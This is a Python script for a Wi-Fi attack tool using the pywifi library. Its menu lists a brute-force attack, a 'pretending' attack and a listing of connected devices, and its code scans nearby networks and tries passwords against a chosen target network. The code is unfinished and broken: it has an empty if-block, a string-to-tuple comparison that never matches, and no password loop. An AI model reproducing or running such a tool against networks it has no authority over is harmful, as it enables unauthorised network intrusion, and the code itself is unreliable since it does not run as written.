import socket as skt
import pywifi
from time import sleep
from os import system
import sys

system('clear')

def print_dashboard():
    dashboard = ''' 
    [ 1 ] WIFI-Bruteforce attack
    [ 2 ] WIFI-Pretending attack
    [ 3 ] List devices who connected to the wifi
    '''
    print(dashboard)

def connect(network_info_obj,password,iface):
    device = pywifi.Profile()
    device.ssid = network_info_obj[0]
    device.auth = pywifi.const.AUTH_ALG_OPEN
    device.akm.append(pywifi.const.AKM_TYPE_WPA2PSK) if network_info_obj[1] == 'LOCK' else device.akm.append(pywifi.const.AKM_TYPE_NONE)
    device.cipher = pywifi.const.CIPHER_TYPE_CCMP if network_info_obj[1] == 'LOCK' else pywifi.const.CIPHER_TYPE_NONE

    if network_info_obj[1] == 'LOCK':
        device.key = password
        iface.remove_all_network_profiles()
        tmp_profile = iface.add_network_profile(device)
        iface.connect(tmp_profile)
        sleep(3)

        if iface.status() == pywifi.const.IFACE_CONNECTED:
            system('clear')
            print(f"Connected! password found : {password}")
            sys.exit()
    else:
        iface.remove_all_network_profiles()
        tmp_profile = iface.add_network_profile(device)
        iface.connect(tmp_profile)
        sleep(3)
        if iface.status() == pywifi.const.IFACE_CONNECTED:
            system('clear')
            print(f"Connected! password found : {password}")
            sys.exit()

def wifi_bruteforce():
    availables = []
    init = pywifi.PyWiFi()
    interface = init.interfaces()[0]
    interface.scan()
    sleep(2)
    networks = interface.scan_results()

    if len(networks) == 0:
        print("No device found")

    for network in networks:
        availables.append((network.ssid,'OPEN' if len(network.akm) == 0 else 'LOCK'))
        signal_strength = f"Good signal({network.signal})" if -network.signal > 50 and -network.signal <= 70 else f"Poor signal({network.signal})"
        print(f'Network name : {network.ssid}\nNetwork MAC(BSSID) : {network.bssid}\nNetwork signal : {signal_strength}\nAuthentication : {'No password' if len(network.akm) == 0 else 'Locked'}'.strip())
        print()

    while True:
        target = input('Enter the target wifi name : ').strip()
        if target in availables:
            name,auth = target
            if auth == 'OPEN':

        else:
            system('clear')
            print(f'Invalid wifi name : {target}')
            continue

wifi_bruteforce()
            